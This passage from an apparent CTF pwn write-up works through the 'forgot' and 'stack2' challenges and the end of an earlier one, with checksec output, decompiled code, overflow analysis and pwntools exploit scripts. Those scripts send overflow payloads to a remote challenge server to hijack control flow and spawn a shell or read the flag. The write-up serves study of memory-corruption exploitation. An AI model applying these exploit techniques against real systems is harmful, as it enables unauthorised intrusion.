+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./reactor_switch&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">42608</span>)</span><br><span class="line"></span><br><span class="line">shell_func_addr = <span class="number">0x04005F6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">512</span> + p64(<span class="number">0</span>) + p64(shell_func_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># ...&gt;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h2><p>Attachment: <a href="/filehost/apcaw/forgot">forgot</a><br>Description: Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br>Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p>
+<h3 id="Information-2"><a href="#Information-2" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file forgot</span><br><span class="line">forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span><br><span class="line">$ checksec forgot</span><br><span class="line">[*] &#x27;/root/forgot&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">32</span>]; <span class="comment">// [esp+10h] [ebp-74h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v3)(); <span class="comment">// [esp+30h] [ebp-54h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v4)(); <span class="comment">// [esp+34h] [ebp-50h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v5)(); <span class="comment">// [esp+38h] [ebp-4Ch]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v6)(); <span class="comment">// [esp+3Ch] [ebp-48h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v7)(); <span class="comment">// [esp+40h] [ebp-44h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v8)(); <span class="comment">// [esp+44h] [ebp-40h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v9)(); <span class="comment">// [esp+48h] [ebp-3Ch]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v10)(); <span class="comment">// [esp+4Ch] [ebp-38h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v11)(); <span class="comment">// [esp+50h] [ebp-34h]</span></span><br><span class="line">  <span class="built_in"><span class="keyword">int</span></span> (*v12)(); <span class="comment">// [esp+54h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+58h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">1</span>;</span><br><span class="line">  v3 = sub_8048604;</span><br><span class="line">  v4 = sub_8048618;</span><br><span class="line">  v5 = sub_804862C;</span><br><span class="line">  v6 = sub_8048640;</span><br><span class="line">  v7 = sub_8048654;</span><br><span class="line">  v8 = sub_8048668;</span><br><span class="line">  v9 = sub_804867C;</span><br><span class="line">  v10 = sub_8048690;</span><br><span class="line">  v11 = sub_80486A4;</span><br><span class="line">  v12 = sub_80486B8;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">32</span>, stdin);</span><br><span class="line">  <span class="built_in">sub_80485DD</span>((<span class="keyword">int</span>)&amp;s);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I should give you a pointer perhaps. Here: %x\n\n&quot;</span>, sub_8048654);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the string to be validate&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( v14 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048702</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">64</span> )</span><br><span class="line">          v14 = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_804874C</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v2[i] == <span class="number">46</span> )</span><br><span class="line">          v14 = <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_8048784</span>(v2[i]) )</span><br><span class="line">          v14 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v14 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(&amp;v3 + --v14))();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fflush</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_8048702</code> (similar to <code>sub_804874C</code> and <code>sub_8048784</code>):</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL4 __cdecl <span class="title">sub_8048702</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sub_80486CC</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80486CC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Eh] [ebp-3Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(&amp;s, <span class="number">0x32</span>u, <span class="string">&quot;cat %s&quot;</span>, <span class="string">&quot;./flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Other functions are all about outputting strings.</p>
+<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>The whole routine of this program is to validate your mail address: first input your name string, then input the mail address to validate.</p>
+<p>Our name will be saved in <code>s</code>, and our mail address will be saved on <code>v2</code>, while the magic function <code>sub_80486CC</code> empower us to <code>cat the flag</code>.<br>Remember <code>(*(&amp;v3 + --v14))();</code> at the tail of <code>main()</code>? It executes what <code>&amp;v3 + --v14</code> points to, so <code>v3</code> is clearly where we should overflow.</p>
+<pre><code>char v2[32]; // [esp+10h] [ebp-74h]
+int (*v3)(); // [esp+30h] [ebp-54h]
+</code></pre>
+<p>Vulnerability appears at <code>__isoc99_scanf(&quot;%s&quot;, v2);</code>, and the offset is easy to confirm, right? No no no, what exactly <code>&amp;v3 + --v14</code> means?<br>The <code>switch ... case</code> statements is long but easy to understand, so if we dont let <code>sub_8048702</code> and other conditions be true, <code>v14</code> will always be <code>1</code>, and <code>&amp;v3 + --v14</code> will always be <code>&amp;3</code>.</p>
+<p>How to get <code>sub_8048702</code> false? After looking up the <code>ASCII</code> table, we can see all the uppercase letters are ok.</p>
+<p>Eventually we get our exploit</p>
+<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;forgot&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43897</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x80486CC</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># What is your name?</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Enter the string to be validate</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p32(cat_flag_addr))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>Another payload is also ok:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">32</span> + <span class="string">&quot;a&quot;</span> * <span class="number">4</span> +  p32(flag_addr)</span><br></pre></td></tr></table></figure>
+<p>A more concise payload is:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">43897</span>)</span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span>*<span class="number">63</span></span><br><span class="line">addr = <span class="number">0x080486cc</span></span><br><span class="line">overflow += p32(addr)</span><br><span class="line">r.send(overflow + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Enter the string to be validate&quot;</span>)</span><br><span class="line">flag = r.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Flag: &quot;</span> + flag</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
+<p>Here is 63 because it inputs from <code>name</code> part, and it only receive 32 bytes but including 1 <code>\x00</code>, so still 32 left for <code>v2</code> part.</p>
+<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><p>Attachment: <a href="/filehost/apcaw/stack2">stack2</a><br>Description: None.</p>
+<p>Just find out what is the flag.</p>
+<h3 id="Information-3"><a href="#Information-3" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file stack2</span><br><span class="line">stack2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped</span><br><span class="line">$ checksec stack2</span><br><span class="line">[*] &#x27;/root/stack2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>Pseudocode:<br><code>main</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*                      An easy calc                       *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*Give me your numbers and I will return to you an average *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*(0 &lt;= x &lt; 256)                                           *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;***********************************************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many numbers you have:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Give me your numbers&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">&quot;average is %.2lf\n&quot;</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Give me your number&quot;</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;id\t\tnumber&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%d\t\t%d\n&quot;</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>hackhere</code>:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackhere</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Address:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># hackhere()</span><br><span class="line">hackhere	0804859B	</span><br><span class="line"># system plt</span><br><span class="line">.plt:08048450                 jmp     ds:off_804A018</span><br><span class="line">.plt:08048450 _system         endp</span><br><span class="line"># &#x27;sh&#x27; string included</span><br><span class="line">.rodata:08048980 command         db &#x27;/bin/bash&#x27;,0        ; DATA XREF: hackhere+14↑o</span><br></pre></td></tr></table></figure>
+<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Still a <code>ret2text</code>(return to <code>.text</code>). Vulnerability exists in <code>main()</code>, belongs to <code>change number</code> subfunction:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;which number to change:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;new number:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">  v13[v5] = v7;                     &lt;--------vulnerable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The index of the array is totally controlled by our input, with no border check, which leads to writing anywhere (the value is controlled by us as well).</p>
+<p>The final goal seems to be <code>hackhere()</code>, we can overwrite <code>ret addr</code> on the stack to execute that function, so the next step is to calculate the target offset/index of array <code>v13</code>.</p>
+<p>Though we have can see pseudocodes produced by IDA pro indicates the distance from <code>ebp</code> to <code>v13</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char v13[100]; // [esp+38h] [ebp-70h]</span><br></pre></td></tr></table></figure>
+<p>But it uses <code>Canary</code> protection mechanism, memory mapping is like:</p>
